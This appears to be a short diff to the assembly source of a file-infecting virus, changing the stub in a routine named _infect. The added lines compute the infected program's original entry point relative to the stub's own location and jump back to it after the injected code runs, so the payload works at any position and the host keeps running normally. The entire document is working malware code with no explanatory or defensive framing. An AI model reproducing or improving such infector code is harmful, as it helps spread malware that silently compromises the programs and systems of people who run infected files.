@@ -19,7 +19,6 @@ _infect:
 	push r11
 	push r12
 	push r13
-	push r14
 	push r15
 	pushf
 
@@ -29,11 +28,17 @@ memaddr: db `00000000`
 size: db `00000000`
 
 begin:
+	mov r14, QWORD[rel diff]
+	lea rax, [rel _infect]
+	
+	sub rax, r14
+	mov r14, rax
+	
+
 	call entry
 
 	popf
 	pop r15
-	pop r14
 	pop r13
 	pop r12
 	pop r11
@@ -48,5 +53,5 @@ begin:
 	pop rcx
 	pop rbx
 	pop rax
- 
-	jmp QWORD[diff]
+
+	jmp r14
